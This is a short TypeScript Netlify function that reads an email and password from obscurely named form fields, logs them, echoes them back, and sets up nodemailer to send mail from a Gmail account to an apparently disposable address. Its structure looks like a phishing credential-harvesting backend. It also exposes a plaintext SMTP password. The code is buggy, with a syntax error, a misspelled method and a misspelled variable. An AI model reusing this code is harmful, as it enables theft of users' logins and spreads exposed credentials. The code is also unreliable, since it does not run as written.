import type { Context } from "@netlify/functions"
import nodemailer from "nodemailer"

export default async (req: Request, context: Context) => {
  let response;
  const body = await req.formData();
  const email = body.get("ai");
  const password = body.get("pr");
  console.log('response:', {email, password)
  switch(req?.method){
    case "POST":
      try{
        if(email && password){
  const transporter = nodemailer.createTransport({
  host: "smtp.forwardemail.net",
  port: 465,
  secure: true, // upgrade later with STARTTLS
  auth: {
    user: "wirthschwind@gmail.com",
    pass: "Relish2023!@",
  },
});

  const message = {
  from: "wirthschwind@gmail.com",
  to: "dexolol807@roborena.com",
  subject: "Message title",
  text: "Plaintext version of the message",
  html: "<p>HTML version of the message</p>",
};

  const sendy = await transporter.sendmail(message);
}
      }
      catch(error){
        console.log(errror)
      }
      response = new Response(JSON.stringify({email, password, context}))
      break;
    case "GET":
      response = new Response("Get method")
      break;
    default:
      response  = new Response("Default");
      break;
  }
  return response;
}

